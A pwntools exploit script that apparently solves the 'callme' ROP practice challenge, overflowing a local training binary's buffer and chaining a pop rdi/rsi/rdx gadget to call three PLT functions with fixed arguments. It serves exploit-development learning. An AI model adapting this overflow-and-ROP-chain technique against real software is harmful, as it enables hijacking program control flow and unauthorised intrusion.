from pwn import *

elf = ELF("./attachment/callme")
rop = ROP(elf)

io = process(elf.path, cwd="./attachment", level="DEBUG")

io.recv()

pop_rdi_pop_rsi_pop_rdx_ret = p64(0x000000000040093c) # pop rdi; pop rsi; pop rdx; ret
arguments = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

payload = b"A" * 40
payload += p64(rop.ret.address)
payload += pop_rdi_pop_rsi_pop_rdx_ret
payload += arguments
payload += p64(elf.plt.callme_one)
payload += pop_rdi_pop_rsi_pop_rdx_ret
payload += arguments
payload += p64(elf.plt.callme_two)
payload += pop_rdi_pop_rsi_pop_rdx_ret
payload += arguments
payload += p64(elf.plt.callme_three)

io.sendline(payload)
io.recvall()